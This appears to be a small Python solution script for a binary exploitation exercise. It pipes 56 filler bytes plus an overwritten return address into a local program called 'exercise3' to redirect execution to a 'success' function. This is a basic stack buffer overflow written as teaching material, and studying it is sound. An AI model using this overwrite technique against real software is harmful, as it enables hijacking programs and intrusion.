#!/usr/bin/python3

import subprocess

# Run the binary and set up the pipes for interaction
process = subprocess.Popen(
        ["./exercise3"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
)

# Read output from the binary and print it
print(process.stdout.readline().strip())

bytes_to_ip = 56
success_address = 0x004011b6
process.stdin.write(b"1"*bytes_to_ip + success_address.to_bytes(8, 'little') + b"\n")
process.stdin.flush()

print(process.stdout.readline().strip())

# Close the process and get the final output
process.stdout.close()
process.stdin.close()
